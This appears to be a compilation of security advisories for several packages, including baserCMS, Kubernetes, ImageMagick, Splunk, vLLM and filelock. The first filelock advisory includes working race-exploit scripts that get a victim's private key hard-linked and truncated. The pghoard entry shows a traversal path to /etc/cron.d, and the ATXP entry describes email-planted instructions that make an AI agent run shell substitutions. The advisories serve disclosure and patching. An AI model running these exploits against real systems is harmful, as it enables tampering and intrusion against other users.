baserCMS is a website development framework. In versions 5.0.0 before 5.3.2 and 5.4.0 before 5.4.2, an authenticated user with only theme-file view permission can traverse outside the theme directory through the optional BcThemeFile plugin's Admin web screen. ThemeFilesController::parseArgs() constructs a path containing literal ../ segments, and the view and edit actions pass it to ThemeFilesService::get() without containment validation. Authorization checks the unresolved request path, after which ThemeFile::_getContents() reads the resolved file and exposes its contents in the form textarea. A client must preserve the dot segments rather than normalize them away. Readable files are limited to .php, .css, .js, and .ctp; this can disclose application source and config/install.php database credentials in MySQL or PostgreSQL deployments, while SQLite configurations have an empty database password. Reading config/app_local.php may expose the Security.salt fallback, which is effective only when not overridden by environment configuration. The flaw does not disclose .env, .pem, or SQLite .db files, does not itself permit file writes or code execution, and does not affect the separate API getFullpath() route. The plugin is disabled by default and unauthenticated requests are not sufficient. This issue has been patched in versions 5.3.2 and 5.4.2.

items.title: StatefulSet and ControllerRevision write permissions allow cross-namespace pod creation
items.description: A confused deputy attack exists in the StatefulSet controller that allows a user with namespace-scoped write permissions on StatefulSet and ControllerRevision objects to create a cross-namespace pod. An attacker exploiting this vulnerability would have full control over the resulting pod’s metadata and specification, including namespace selection. Note that the cross-namespace pod will be immediately deleted by the garbage collector unless the attacker is able to construct a valid StatefulSet OwnerReference. This would require referencing the UID of an existing StatefulSet in the victim’s namespace.

ApostropheCMS is an open-source Node.js content management system. Prior to 3.7.0 of the import-export module, an authenticated importer can submit a tar entry whose normalized destination targets a directory while bypassing the literal parent-path substring guard. Opening that directory as a write stream emits an unhandled filesystem error that can terminate the Node.js process; the source establishes this static primitive but not an end-to-end exploit or controlled arbitrary file read or write. This issue is fixed in version 3.7.0.

ApostropheCMS is an open-source Node.js content management system. Prior to 4.33.0 of ApostropheCMS and 1.6.1 of passport-bridge, cross-host or cross-locale session migration places a single-use bearer session token in a redirect URL. A client that obtains and redeems a still-valid, unconsumed token before its first use can adopt the associated session, including through the passport-bridge cross-locale flow. This issue is fixed in ApostropheCMS 4.33.0 and passport-bridge 1.6.1.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the MSL decoder that fails to release allocated memory when processing a crafted MSL image. Attackers can supply crafted MSL files for processing to repeatedly leak memory, causing resource exhaustion and denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a null pointer dereference in the DJVU decoder because the result of a memory allocation is not checked before use. Attackers can supply a DJVU image that, when processed under conditions where the allocation fails, crashes the process and causes a denial of service.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-33 contains a memory leak in the JNG encoder that fails to release allocated memory when processing a crafted image. Attackers can supply crafted images that are encoded to JNG to leak memory, potentially causing resource exhaustion and a limited denial of service.

In Splunk Enterprise versions below 10.4.4 and 10.2.8, a user who does not hold the "admin" or "power" Splunk roles could derive the PostgreSQL sidecar database superuser password and run arbitrary operating system commands as the user account running Splunk Enterprise on search head cluster members.
The vulnerability is possible because the PostgreSQL sidecar service derives a privileged database password from the search head cluster identifier that appears in search job logs.
For more information see About configuring role-based user access (https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.2/manage-splunk-platform-users-and-roles/about-configuring-role-based-user-access), server.conf (https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/configuration-file-reference/10.2.0-configuration-file-reference/server.conf), and Sidecar configuration settings (https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/splunk-sidecars/sidecar-configuration-settings) in the Splunk documentation.

items.title: filelock: SoftFileLock stale-break restore follows a swapped-in symbolic link and hard-links a file of the user running the lock into the lock directory
items.description:
When a soft-lock stale break finds that the marker (the lock file at `<path>`) it renamed aside was a live one recreated by a successor, the restore branch of `break_lock_file()` checks the break name with `lstat` (a check that reads a name without following a symbolic link) and then calls `os.link(break_path, lock_file)` by name. On CPython 3.12 and later on Linux (and on macOS) that call follows a symbolic link (a file that redirects to another path). A local user (the other user below) who can write a shared lock directory without the sticky bit (a directory flag that lets only a file's owner rename or remove it) replaces the break name with a symbolic link between those two calls.

The `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease` or `lifetime` break of the user running the lock (the lock user below) then creates a hard link (a second name for the same file), in that directory, to any of the lock user's own files on the same filesystem. That includes files inside directories the other user cannot enter and links that `fs.protected_hardlinks` (a Linux setting that forbids hard links to files one does not own) refuses the other user when it asks itself. The link exposes the file's size, times, mode and owner, keeps the inode (the kernel's identity for a file, independent of its name) alive, and gives the other user a name it can move. On 4.2.0 a later `FileLock` of the lock user on that name truncated the file. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding `ANT-2026-SB29HIAL`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N, 5.3 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): two short races against a few lines of Python, timed by inotify (a Linux facility that reports file events), and the lock user must take the lock again and again (the scanner won 10 runs out of 10 after 9 to 910 lock cycles). `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:L` (low confidentiality impact): the file's metadata through the new name, not its content. `I:H` (high integrity impact): the other user chooses the file, and whatever the lock user later does to names in that directory lands on it. On 4.2.0 the lock user's own `FileLock` truncated the 17-byte private file to 0 bytes and, with a permissive `mode`, would have changed its mode too. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional on a shared parent without the sticky bit, which crosses the protected-directory boundary. The scanner rated it high (CWE-363). This is an earlier-public-context finding. #786 added the restore branch and guarded a symbolic link already present when `lstat` runs, not one swapped in after it.

## Scope and preconditions

- The other user can write the lock directory, and it has no sticky bit: a `0777` or group-writable cache or project directory. In a root-owned `1777` directory the unprivileged lock user cannot rename the other user's marker and only waits. In a `1777` directory the lock user owns, `fs.protected_symlinks=1` (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) makes the `link` fail with `EACCES` (permission denied). Testing showed no effect in sticky directories.
- The interpreter's `os.link` follows symbolic links. CPython 3.14 on Linux issues `linkat(..., AT_SYMLINK_FOLLOW)`. CPython 3.11 issues `link(2)`, which links the symbolic link itself, and is not affected. The scanner did not test 3.12 and 3.13. On macOS `link(2)` follows (confirmed in our review on macOS 27.0.1: a plain `os.link` of a symbolic link gave the target `st_nlink` 2, that is two names).
- The target file and the lock directory are on the same filesystem (hard links cannot cross filesystems), and the lock user takes the lock more than once.
- Every soft-lock path reaches the branch: `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease` and the `lifetime` break. The native `FileLock` does not, but it is the consumer that turns the planted link into a truncation.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it, which no file-based lock can defend against. This finding is about what the lock itself adds inside such a directory, a hard link the other user cannot make on its own.

## Affected code

At the scanned commit b831496, the restore branch of [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L113-L122) runs for [`SoftFileLock._try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123), [`MarkerSoftFileLock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_marker.py#L74-L81), [`SoftFileLease`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_lease.py#L229-L256) and the [`lifetime` break](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1576-L1588). The truncation in [`UnixFileLock._finalize_locked_fd`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_unix.py#L150-L154) is what a later native lock on the planted name did to the file (reported in its own advisory).

## Introduced

fc73fc51e137 ("fix(soft): restore a live marker a stale break moved aside", #786, 2026-10-08), first released in 4.1.0 (verified against the tags). Releases before 4.1.0 have no restore branch, so this does not affect them.

## Mechanism

```python
# src/filelock/_util.py:115-122
break_path: Final[str] = f"{lock_file}.break.{os.getpid()}.{secrets.token_hex(16)}"
Path(lock_file).rename(break_path)
if (st_after := os.lstat(break_path)).st_mtime <= mtime_before and st_after.st_ino == ino_before:
    Path(break_path).unlink()
elif stat.S_ISREG(st_after.st_mode) and _HAS_LINK:  # pragma: needs hard-link
    with suppress(FileExistsError):
        os.link(break_path, lock_file)
        Path(break_path).unlink()
```

The `S_ISREG` test (is it a regular file) is about what `lstat` saw on line 117, not about what `link` resolves on line 121. The docstring says the code must not put a symbolic link back "because `link` would follow a symlink to its target", and the test at the scanned commit names the consequence ("publish the victim file's inode at the lock path"), but that test only covers a symbolic link that is already there when `lstat` runs. The 128-bit token stops others from guessing the break name, not from reading it. The name is in the directory listing from the moment the rename has happened. The package's other links pass `follow_symlinks=False` where the runtime honours it; this one does not. An `strace` (a tool that logs a process's system calls) on CPython 3.14.8 shows `os.link(a, b)` as `linkat(AT_FDCWD, a, AT_FDCWD, b, AT_SYMLINK_FOLLOW)`.

The other user plays both the stale holder and the "successor" the branch exists for:

1. The other user leaves a genuine marker of a dead process at the lock path (a forked child takes the lock and `_exit`s). The lock user's `_try_break_stale_lock()` reads it and `owner_is_stale()` agrees, so `break_lock_file()` renames it to `app.lock.break.<pid>.<token>`. In a directory without the sticky bit the lock user may rename a file it does not own.
2. The other user still owns that file and gives it a newer mtime (modification time) after the `lstat` on line 113. Line 117 then takes it for a recreated marker, and line 119 sees a regular file.
3. The other user renames a symbolic link to the lock user's private file over the break name.
4. Line 121 resolves the link with the lock user's credentials, so `app.lock` becomes a second hard link to the private file. Line 122 removes the symbolic link.

The other user's own `os.link()` on the private file fails with `EACCES` (it cannot enter the `0700` directory). On a file of the lock user it can reach, `fs.protected_hardlinks=1` answers `EPERM` (operation not permitted). The lock user would evict the odd "marker" after `MALFORMED_LOCK_AGE_THRESHOLD` (2 s), so the other user moves it to another name first, which the non-sticky directory allows. Both steps are races against a few lines of Python. There are about 40 µs between the `lstat` on line 113 and the one on line 117 (half of it the `rename`), and about 2 µs between line 117 and the `os.link()` call. inotify tells the other user when to act. A watch reports the lock user closing the marker after reading it, then the rename together with the break name. A bump that comes before line 113 costs nothing, since line 113 returns and the lock user looks again on its next poll.

## Reproduction

The scanner's reproducer for finding `ANT-2026-SB29HIAL`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys

sys.stdout.reconfigure(line_buffering=True)

SHARED_DIR = "/tmp/shared-locks"
LOCK_PATH = SHARED_DIR + "/app.lock"
PRIVATE_DIR = "/home/victim/private"
KEY_PATH = PRIVATE_DIR + "/signing.key"
AS_VICTIM = {"user": "victim", "group": "victim", "extra_groups": []}
AS_ATTACKER = {"user": "attacker", "group": "attacker", "extra_groups": []}
# strace alters no call. On calls that name the lock path it holds the victim 2 s after rename() and 2 s before
# linkat(), that is on both sides of the lstat of the break name in break_lock_file() (src/filelock/_util.py:117).
SLOWED_DOWN = ["strace", "-o", "/dev/null", "-P", LOCK_PATH, "-e", "trace=rename,linkat"]
SLOWED_DOWN += ["-e", "inject=rename:delay_exit=2000000", "-e", "inject=linkat:delay_enter=2000000"]

# set up: the victim's key in a 0700 directory, and a lock directory anyone can write, without the sticky bit
shutil.rmtree(PRIVATE_DIR, ignore_errors=True)
os.mkdir(PRIVATE_DIR, 0o700)
with open(KEY_PATH, "w") as key_file:
    key_file.write("0123456789abcdef\n")
os.chmod(KEY_PATH, 0o600)
shutil.chown(PRIVATE_DIR, "victim", "victim")
shutil.chown(KEY_PATH, "victim", "victim")
shutil.rmtree(SHARED_DIR, ignore_errors=True)
os.mkdir(SHARED_DIR)
os.chmod(SHARED_DIR, 0o777)
key_before = os.stat(KEY_PATH)
print(f"{KEY_PATH}: links={key_before.st_nlink} size={key_before.st_size}")
for knob in ("protected_hardlinks", "protected_symlinks"):
    print(f"fs.{knob} =", open(f"/proc/sys/fs/{knob}").read().strip())

# control: the attacker cannot give the key a name in the shared directory by itself
link_by_attacker = f"import os; os.link({KEY_PATH!r}, {SHARED_DIR + '/by-attacker'!r})"
control = subprocess.run([sys.executable, "-c", link_by_attacker], capture_output=True, text=True, **AS_ATTACKER)
print("CONTROL the attacker's own link() of the key:", control.stderr.strip().splitlines()[-1])

# attack: the victim takes an ordinary SoftFileLock while the attacker works on the break name
subprocess.run([sys.executable, "/tmp/repro.d/plant_stale_marker.py", LOCK_PATH], check=True, **AS_ATTACKER)
attacker = subprocess.Popen([sys.executable, "/tmp/repro.d/swap_break_name.py", LOCK_PATH, KEY_PATH], **AS_ATTACKER)
victim_job = [*SLOWED_DOWN, sys.executable, "/tmp/repro.d/victim_job.py", LOCK_PATH]
subprocess.run(victim_job, check=True, timeout=60, **AS_VICTIM)
assert attacker.wait(timeout=30) == 0, "the attacker did not get through its steps"

# check, as root: does the key now have a name in the shared directory?
key_after = os.stat(KEY_PATH)
names_of_the_key = [
    name for name in os.listdir(SHARED_DIR) if os.path.samestat(key_after, os.lstat(f"{SHARED_DIR}/{name}"))
]
print(f"OBSERVED {KEY_PATH}: links={key_after.st_nlink}, names in {SHARED_DIR} with its inode: {names_of_the_key}")

if names_of_the_key:
    # what that name is good for: another program of the victim takes a FileLock there, which truncates the file
    shared_name = f"{SHARED_DIR}/{names_of_the_key[0]}"
    victim_other_job = [sys.executable, "/tmp/repro.d/victim_other_job.py", shared_name]
    subprocess.run(victim_other_job, check=True, timeout=60, **AS_VICTIM)
    print(f"OBSERVED {KEY_PATH}: size={os.stat(KEY_PATH).st_size} after the victim's FileLock({shared_name!r})")

print("BUG" if control.returncode != 0 and names_of_the_key else "OK")
```

#!/usr/bin/env python3
"""Optional, not run by repro: the two steps of swap_break_name.py, timed by inotify against a victim that nobody pauses."""
import ctypes
import os
import random
import struct
import sys
import time

from filelock import SoftFileLock

lock_path, victim_file, kept_name = sys.argv[1:]
os.chdir(os.path.dirname(lock_path))
lock_name = os.path.basename(lock_path).encode()
IN_NONBLOCK, IN_CLOSE_NOWRITE, IN_MOVED_TO = 0o4000, 0x10, 0x80


def spin(microseconds):
    until = time.perf_counter() + microseconds / 1e6
    while time.perf_counter() < until:
        pass


# The bytes of a genuine marker of a dead process.
if os.fork() == 0:
    crashed_holder = SoftFileLock(lock_path)
    crashed_holder.acquire()
    os._exit(0)
os.wait()
with open(lock_name, "rb") as marker_file:
    stale_marker = marker_file.read()
os.unlink(lock_name)

libc = ctypes.CDLL(None)
inotify = libc.inotify_init1(IN_NONBLOCK)
libc.inotify_add_watch(inotify, b".", IN_MOVED_TO)
marker_mtime = 1_000_000_000
lock_cycles = 0
while True:
    lock_cycles += 1
    os.symlink(victim_file, b"symlink")
    marker = os.open(b"staged", os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o644)
    os.write(marker, stale_marker)
    os.utime(marker, (marker_mtime, marker_mtime))
    marker_watch = libc.inotify_add_watch(inotify, b"staged", IN_CLOSE_NOWRITE)
    while True:  # plant it as soon as the victim has released the lock
        try:
            os.link(b"staged", lock_name)
            break
        except FileExistsError:
            pass
    os.unlink(b"staged")

    break_name = None
    while break_name is None:
        try:
            events = os.read(inotify, 4096)
        except BlockingIOError:
            continue
        while events and break_name is None:
            _, mask, _, name_length = struct.unpack_from("iIII", events)
            name = events[16 : 16 + name_length].rstrip(b"\0")
            events = events[16 + name_length :]
            if mask & IN_CLOSE_NOWRITE:
                # The victim has read the marker and is about to judge it stale and lstat it again. A bump that comes
                # before that lstat only makes the victim start over on its next poll.
                spin(random.uniform(40, 100))
                marker_mtime += 1
                os.utime(marker, (marker_mtime, marker_mtime))
            elif name.startswith(lock_name + b".break."):
                # The victim has renamed the marker and is about to lstat the break name and link it back.
                os.rename(b"symlink", name)
                break_name = name
    libc.inotify_rm_watch(inotify, marker_watch)
    os.close(marker)

    time.sleep(0.001)
    try:
        at_lock_path = os.lstat(lock_name)
        if at_lock_path.st_uid != os.getuid() and at_lock_path.st_nlink == 2:
            os.rename(lock_name, kept_name)
            print(f"after {lock_cycles} lock cycles the victim linked its file here as {kept_name!r}:", at_lock_path)
            break
    except FileNotFoundError:
        pass
    for leftover in (b"symlink", break_name):
        if os.path.lexists(leftover):
            os.unlink(leftover)
    try:
        os.read(inotify, 65536)
    except BlockingIOError:
        pass

## Attack sequence

```mermaid
sequenceDiagram
    participant X as other local user (uid 1001)
    participant D as /tmp/shared-locks (0777, not sticky)
    participant V as SoftFileLock of the lock user (uid 1000)
    participant K as ~victim/private/signing.key (0600 in a 0700 dir)
    X->>D: child takes app.lock and _exit()s: dead-holder marker owned by X
    V->>D: read marker, owner_is_stale, lstat ok: rename app.lock to app.lock.break.*
    rect rgb(255, 214, 214)
        X->>D: inotify sees the rename: utime the break file (newer mtime)
        V->>D: lstat break name: mtime newer, S_ISREG: treat as a recreated live marker
        X->>D: rename a symbolic link to signing.key over the break name
        V->>K: os.link(break name, app.lock) follows the symbolic link: app.lock is a second name of the file
        X->>D: rename app.lock to other.lock before the 2 s eviction
        Note over V,K: the lock user's FileLock("other.lock") on 4.2.0 truncates the file to 0 bytes
    end
```

## Evidence

The scanner's reproducer takes about 5 s and is deterministic. Root creates `/home/victim/private` (`0700`) with `signing.key` (17 bytes, `0600`) and `/tmp/shared-locks` (`0777`, no sticky bit), with `fs.protected_hardlinks = 1` and `fs.protected_symlinks = 1`. In the control step, the `attacker` account runs `os.link(key, /tmp/shared-locks/by-attacker)` and gets `Permission denied`. Then the `attacker` child leaves `app.lock held by pid 253 which has exited`. The `victim` account runs `with SoftFileLock(path)` under `strace -P ... -e inject=rename:delay_exit=2000000 -e inject=linkat:delay_enter=2000000`, which holds it 2 s after its `rename()` and 2 s before its `linkat()` without changing any call. The `attacker` account bumps the break file, swaps in the symbolic link, and renames `app.lock` to `other.lock`.

The result line reads `signing.key: links=2, names in /tmp/shared-locks with its inode: ['other.lock']`, and after the `victim` account's second program takes `FileLock('/tmp/shared-locks/other.lock')`, `size=0`. Verdict `BUG`. The unpaused variant (`unpaused_victim.py` looping on the lock, `unpaused_attacker.py` timing both steps with inotify) won 10 runs out of 10 on the 2-CPU image after 9 to 910 lock cycles (1 to 65 s); one run won after 128 cycles (8 s).

Our review: BUG on 4.2.0 (triage), OK on the head of #843. On macOS 27.0.1 (CPython 3.13.16) a plain `os.link` of a symbolic link follows it (target `st_nlink` 2) while `follow_symlinks=False` links the symbolic link itself, which confirms the report's macOS note.

## Impact

A local user who can write a lock directory that has no sticky bit makes a user of a soft lock in that directory create a hard link there to one of that user's own files on the same filesystem, including files inside directories the other user cannot enter. The content stays unreadable, but the other user now reads size, times, mode and owner of the file through the new name, keeps the inode alive after the lock user deletes or rotates the file, and holds what `fs.protected_hardlinks` exists to deny, a name it can move around for someone else's file.

Whatever the lock user later does to names in that directory lands on the file, and filelock 4.2.0 was such a consumer itself. `UnixFileLock._finalize_locked_fd()` ran `os.ftruncate(fd, 0)` on whatever regular file `O_NOFOLLOW` let it open. The other user moved the link to `other.lock`, the lock user took `FileLock("other.lock")`, and the 17-byte private file became 0 bytes. The other user can also move the link into sticky `/tmp` on the same filesystem before the lock user locks it there, and a `FileLock` with a permissive `mode` such as `0o666` applied that mode to the private file too, after which the other user could write its content.

On its own, without such a second lock, the result is the link and the metadata above. The other user has to win two short races and needs the lock user to take the lock more than once. Not affected: sticky directories on the tested settings, CPython 3.11 on Linux, releases before 4.1.0.

## Workarounds

Keep soft locks out of directories other users can write without the sticky bit; a `0700` directory of the lock's user, or a sticky directory, is not affected. On CPython 3.11 on Linux the swap has no effect. Do not take a native `FileLock` on a name another user controls.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/843

items.title: Subpath symlinking on Windows nodes permits NTLM coercion
items.description: An NTLM coercion vulnerability exists on Windows nodes when the subPath supplied in a pod's volumeMounts is set to a symbolic link that points to an attacker-controlled network share. When a kubelet resolves symlinks, it does not reject a target that resolves to a UNC path. As a result, the kubelet will transparently attempt to authenticate to the share using NTLM. This allows an attacker to obtain the NetNTLMv2 hash of the account under which the kubelet is running. An attacker could then attempt to crack the hash to retrieve the corresponding password or relay it to impersonate the node, if the node is domain-joined.

youlai-boot through 2.21.1 contains a missing authorization vulnerability that allows authenticated users to assign arbitrary menu and button permissions to roles via PUT /api/v1/roles/{roleId}/menus. Low-privileged users such as the GUEST test account can grant all permissions to their own role, refreshing the Redis permission cache to gain administrator-equivalent access.

items.title: Docker Desktop logs can expose stored third-party credentials
items.description: Docker Desktop before version 4.97.0 could write third-party API keys and OAuth access tokens in cleartext to local application logs and diagnostics bundles due to insufficient IPC payload redaction. An attacker with read access to these files could obtain the credentials. These OAuth tokens are not Docker account tokens. Docker Desktop 4.94.0 and 4.95.0 addressed the known logging paths, but logs containing credentials can remain after upgrading. Docker Desktop 4.97.0 fixes the issue and includes cleanup of existing host logs and crash dumps.

ATXP Gemini CLI extension through 1.0.0 contains an OS command injection vulnerability in runAtxp() that allows attackers to execute shell commands through unsanitized MCP tool parameters. Attackers can plant instructions in email or SMS content to inject $() or backtick substitutions into parameters like message_id, subject, or query, running commands as the user.

Autobahn Python is a WebSocket and WAMP implementation for Python that supports Twisted and asyncio. From 26.7.1 until 26.10.1, PerMessageBrotli.decompress_message_data in compress_brotli.py calls the Brotli decompressor without an output limit and checks maxMessagePayloadSize only after a complete frame has been inflated. An unauthenticated WebSocket client can send a small, highly compressed frame that allocates hundreds of MiB before rejection, causing memory-exhaustion denial of service on servers that enable the opt-in permessage-brotli feature through the compress extra. Deflate and bzip2 already enforce the remaining output budget and are outside this residual vulnerability. This issue is fixed in version 26.10.1.

pghoard is a PostgreSQL backup daemon and restore tooling that stores backup data in cloud object stores. Prior to version 2.7.2, an incomplete path traversal fix in pghoard allows an attacker with write access to the backup object storage (such as S3, GCS, or Azure) to execute arbitrary file writes and directory creation outside the designated PostgreSQL data directory (pgdata). When a database administrator executes a restore operation (via pghoard_restore get-basebackup), a maliciously crafted delta backup manifest with path traversal sequences (e.g., ../../../../etc/cron.d/backdoor) will write arbitrary payloads to the host system. This issue has been patched in version 2.7.2.

items.title: sanitize_message() address regex is lowercase-only and does not match PIL's uppercase __repr__, leaking live heap addresses to unauthenticated clients
items.description:
### Summary

`sanitize_message()` scrubs heap addresses from error messages with the regex `r" at 0x[0-9a-f]+>"` - lowercase only, no `IGNORECASE`. `PIL.Image.Image.__repr__` formats its address as `0x{id(self):X}` - uppercase. The scrubber structurally cannot match the one object class both parent advisories are about.

A 564-byte PNG sent to an unauthenticated endpoint returns a live heap address of the running server process.

This is not a new hardening proposal. The CVE-2026-54236 advisory explicitly recommended widening this exact regex to `[0-9a-fA-F]`; three months on it is byte-identical.

### Details

#### The mismatch

```python
# the scrubber
r" at 0x[0-9a-f]+>"

# what PIL actually emits
# PIL/Image.py — Image.__repr__
"<%s.%s image mode=%s size=%dx%d at 0x%X>" % (..., id(self))
```

The parent CVE's own lowercase `BytesIO` shape is scrubbed correctly today. PIL's uppercase form is not.

#### The sink

`vllm/multimodal/processing/context.py:347` f-strings the PIL objects into any HF-processor failure message, which is returned to the client.

#### Why the recommendation was dropped - the in-tree answer

`test_error_sanitization.py` already contains a case with the id `pil-image-repr`, asserting that the PIL form is scrubbed. Its input is a hand-written **lowercase** literal that PIL never emits. I ran both halves against the same object class: the test passes, and a real `repr()` leaks.

That is why a documented, accepted recommendation looked already-covered and was never implemented. Any fix must include a test built from a real `repr()`, not from a literal.

#### Related PRs inspected at diff level (neither closes this)

* **PR #35492** adds `sanitize_message` to a new Responses-API WebSocket path, continuing the CVE-2026-54236 remediation - but does not widen the regex, and its new test also uses a lowercase literal.
* **PR #52120** patches a stale path (`serve/utils/api_utils.py`) and only touches the path regex's backtracking.

### Reachability - default configuration, no authentication

* `api_key` defaults to `None`, and `AuthenticationMiddleware` is installed only when a key is configured - a default `vllm serve` is entirely unauthenticated.
* Even with `--api-key` set, `GUARDED_PREFIX = ("/v1", "/v2", "/inference", "/cohere")`, so `/tokenize` remains unauthenticated.
* Default-on for any multimodal deployment.

### Impact

Information disclosure: a live heap address of the API-server process, to an unauthenticated remote client. CWE-532.

**Scope, stated plainly.** This is information disclosure, not memory corruption. It is Stage 1 of the chain CVE-2026-22778 was rated 9.8 for - an ASLR defeat that made the second stage reliable. **Stage 2 is patched at the current OpenCV floor, so I am not claiming RCE.** The value of the fix is that the disclosure primitive the chain depended on is still live, and the advisory that recommended closing it was never acted on.

**Proposed CVSS v3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` (5.3, Medium). Severity is proposed, not insisted on.

### Suggested fix

1. Widen the regex to `[0-9a-fA-F]` and add `re.IGNORECASE`, as CVE-2026-54236's advisory recommended.
2. Replace the `pil-image-repr` test case's hand-written literal with a string produced by calling `repr()` on a real `PIL.Image.Image`, so the case cannot pass while the production path leaks. Apply the same to PR #35492's new test.

Item 2 matters as much as item 1 here: the test is the reason the first recommendation was lost.

### Weaknesses of this report, stated upfront

* No GPU was used. Results come from the in-tree GPU-less render server (`vllm launch render`), which runs the real frontend, the real request model and the real `/tokenize` route. Media processing happens entirely in the frontend, so I do not believe the engine's presence changes the result - but I have not confirmed it under a full `vllm serve`.
* The disclosed value is an address, not memory contents. No read primitive is claimed.
* I did not attempt to chain this to anything.

---

*Prepared with AI assistance (Claude), per the repository's contributing guidance on disclosing AI-assisted contributions. All findings were verified by executing vLLM's own code at the commits cited; the analysis and the claims are my own.*

*Reported by Eva Crystal / 0xiviel (XSource Security).*

## Affected versions

- Package: `vllm` (PyPI).
- Affected versions: `>= 0.14.0rc1, < 0.31.0`.
- First stable patched version: `0.31.0`.

Advisory fixed in [#58832](https://github.com/vllm-project/vllm/pull/58832).

vLLM from 0.7.3 before 0.31.0 forwards the request-supplied mm_processor_kwargs.code_revision to Transformers AutoProcessor.from_pretrained, letting clients select which revision of a model's dynamic processor code is imported when trust_remote_code is enabled. An attacker controlling a revision in the served model repository can send a multimodal request to the unauthenticated /tokenize endpoint to execute arbitrary Python in the vLLM API process.

items.title: filelock: SoftFileLock evicts a fresh lock file whose watched age another local user's pre-dated file passed on through inode reuse
items.description:
`SoftFileLock` and `MarkerSoftFileLock` evict an unparsable marker (the lock file at `<path>`, whose presence says a process holds the lock) once a waiting contender has watched it unchanged for two seconds. `SoftFileLease` expires a lease the same way. The watch tells two looks apart by the marker's modification time (mtime) and inode number (the kernel's identity for a file, independent of its name) alone.

Another local user (the other user below) who can create files in the lock's directory, a sticky `/tmp` included (the sticky bit is a directory flag that lets only a file's owner remove it), parks an empty file of its own at the lock path. It dates that file to a future tick of the kernel's coarse clock (a clock that advances in steps of 4 ms), lets the waiters of the user running the lock (the lock user below) watch it past two seconds, and unlinks it in that tick. On a filesystem that hands a freed inode number straight back (ext4, overlayfs on ext4) the lock user's next marker repeats both values. It inherits the time spent watching the other user's file, and a second waiter removes it while its owner holds the lock.

Two of the lock user's processes then run the critical section together with no error. A `SoftFileLease` waiter takes a live lease that its owner wrote moments before, within milliseconds instead of after `lease_duration`. Affected versions: filelock >= 4.1.0 and <= 4.2.0 (finding `ANT-2026-RKC48J5B`).

## Severity

**CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N, 4.7 (Medium).**

`AV:L` (local): the other user needs an account on the same host. `AC:H` (high attack complexity): a race the other user cannot steer. It needs ext4-style inode reuse, a coarse-clock timestamp tick the other user can predict, and two polls of the lock user inside a 4 ms tick and a ~75 µs create-to-write gap. The scanner measured 2 to 10 % of attempts; none of our own 250 attempts fired. `PR:L` (low privileges): an unprivileged account is enough. `UI:N` (no user interaction): the lock user's processes act on their own. `C:N` (no confidentiality impact): the other user reads nothing. `I:H` (high integrity impact): two holders write the data the lock protects, and neither learns of the other. `A:N` (no availability impact): the lock keeps working.

Classification from the review: security, conditional, by mechanism. It is the same cross-UID primitive (a UID is a user account's numeric id) as the stale-break inode-reuse race reported in a separate advisory: an inode number reused after the other user's unlink in a sticky directory, which our review reproduced across UIDs, plus a forged future mtime. The scanner rated it high (CWE-694) and demonstrated it across UIDs in its own runs. It did not fire in 250 attempts of ours over ext4 with inode reuse confirmed, nor in the scanner-side triage, so its cross-user claim rests on the report's own runs and on the mechanism.

## Scope and preconditions

- The other user can create files in the lock's directory; a root-owned `1777` directory is enough. It creates, `utime`s (sets the timestamps of) and unlinks only its own file. In the sticky directory its `unlink`, `rename`, `open(..., "w")` and `utime` on a marker of the lock user all fail, and deleting its own file only frees the lock.
- The directory is on a filesystem that reuses a freed inode number at once: ext4, and overlayfs on it (thousands of create/unlink cycles returned one number). tmpfs does not reuse one, so the pair cannot repeat there; btrfs does not either.
- File timestamps come from a coarse clock whose future values the other user can compute (`CLOCK_REALTIME_COARSE`, 4 ms steps on Linux 6.1; 20,000 file creations all carried that clock's value).
- At least two processes of the lock user are waiting on the lock while the other user's file is there. The other user does not choose which processes overlap or when; each attempt blocks the lock for 2.2 s (for a lease, `lease_duration`).
- No symbolic link, hard link or FIFO takes part, so the `fs.protected_*` sysctls (Linux settings that restrict following links and opening pipes in sticky world-writable directories) play no part. `StrictSoftFileLock` keys its watch the same way but only raises `SoftFileLockProtocolError`, so it breaks no lock there.

filelock's checks against another local user hold only when no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

